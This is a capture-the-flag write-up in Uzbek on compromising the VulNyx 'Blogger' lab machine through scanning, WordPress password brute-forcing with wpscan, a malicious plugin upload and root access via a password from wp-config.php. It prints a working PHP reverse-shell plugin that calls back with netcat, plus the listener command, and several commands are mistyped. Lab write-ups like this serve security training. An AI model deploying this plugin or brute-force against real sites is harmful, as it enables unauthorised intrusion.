# BLOGGER

![image.png](BLOGGER/image.png)

Men VulNyx saytidagi blogger yechish uchun virtualboxga yuklab oldim.

Keyin qadamda men ip address berdi shuni men nmap va gobuster orqali skannerlab oldim.

![Screenshot From 2026-10-17 09-04-53.png](BLOGGER/Screenshot_From_2026-10-17_09-04-53.png)

```jsx
nmap 10.60.40.149 -sV -p-
gobuster dir -u http://10.60.40.149 -w /usr/share/dirb/common.txt
```

![Screenshot From 2026-10-17 09-05-24.png](BLOGGER/Screenshot_From_2026-10-17_09-05-24.png)

Keyin men gobuster o`rniga undan ham kuchliroq ffuf dan foydalandim.

![Screenshot From 2026-10-17 09-23-50.png](BLOGGER/Screenshot_From_2026-10-17_09-23-50.png)

```jsx
ffuf -u http://10.60.40.149/FUZZ \ /usr/share/seclists/Discovery/Web-Content/common.txt
```

Faqat meni laptopimda ffuf o`rnatib oldim va keyin natijaga e`tiboringizni qarating.

![Screenshot From 2026-10-17 09-29-49.png](BLOGGER/Screenshot_From_2026-10-17_09-29-49.png)

![Screenshot From 2026-10-17 09-30-28.png](BLOGGER/Screenshot_From_2026-10-17_09-30-28.png)

Seclists ni yuklab olish kodi.

```jsx
sudo apt upgrade | sudo apt update
sudo apt install seclists
```

Men chrome yordami url larni ko`rib chiqdim.

![Screenshot From 2026-10-17 09-32-29.png](BLOGGER/Screenshot_From_2026-10-17_09-32-29.png)

![Screenshot From 2026-10-17 11-31-13.png](BLOGGER/Screenshot_From_2026-10-17_11-31-13.png)

Men wpscan orqali saytni skaner qildim

```jsx
wpscan --url http://10.222.7.60/wordpress  --passwords /usr/share/wordlists/rockyou.txt
```

kodini kiritdim.

![Screenshot From 2026-10-17 11-41-01.png](BLOGGER/Screenshot_From_2026-10-17_11-41-01.png)

So`ng men wp-admin sayti kirish uchun login va parolini topdim va shu orqali saytga kirdim.

![Screenshot From 2026-10-17 11-42-53.png](BLOGGER/Screenshot_From_2026-10-17_11-42-53.png)

![Screenshot From 2026-10-17 11-50-21.png](BLOGGER/Screenshot_From_2026-10-17_11-50-21.png)

Shu plugin.php ni zip fayl qilib saytga yukladim.

![Screenshot From 2026-10-17 13-09-51.png](BLOGGER/Screenshot_From_2026-10-17_13-09-51.png)

plugin.php ichidagi kod

```jsx
<?php
  /**
  * Plugin Name: WordPress (Reverse Shell)
  * Plugin URI: https://wordpress.org
  * Description: (Pwn3d!)
  * Version: 1.0
  * Author: d4t4s3c
  * Author URI: https://github.com/d4t4s3c
  */
  exec("busybox nc 10.222.7.56  4444 -e /bin/sh");
?>
    
```

![Screenshot From 2026-10-17 12-28-29.png](BLOGGER/Screenshot_From_2026-10-17_12-28-29.png)

```jsx
zip plugin.php
```

Va plugin.php faylni ziplab yuklab keyin men nc -lvnp orqali tingladim.

```jsx
nc -lvnp 4444
```

Orqali shell keldi.Terminalni to`g`irlash kodi.

```jsx
scrept /dev/null -c bash
```

![Screenshot From 2026-10-17 12-29-49.png](BLOGGER/Screenshot_From_2026-10-17_12-29-49.png)

Keyin men foydalanuvchi huquqlariga qiziqdim.

```jsx
sudo -l
```

![Screenshot From 2026-10-17 12-37-48.png](BLOGGER/Screenshot_From_2026-10-17_12-37-48.png)

Men birinchi flagni topdim. Keyingi qadamda rootga kirish paroli wp-config.php ichidaligidan foydalanib, root ga o`tib oldim.

![Screenshot From 2026-10-17 12-46-51.png](BLOGGER/Screenshot_From_2026-10-17_12-46-51.png)

Mission yakuniga yetdi.Bunda ikkinchi flagni ham ko`rishiiz mumkin.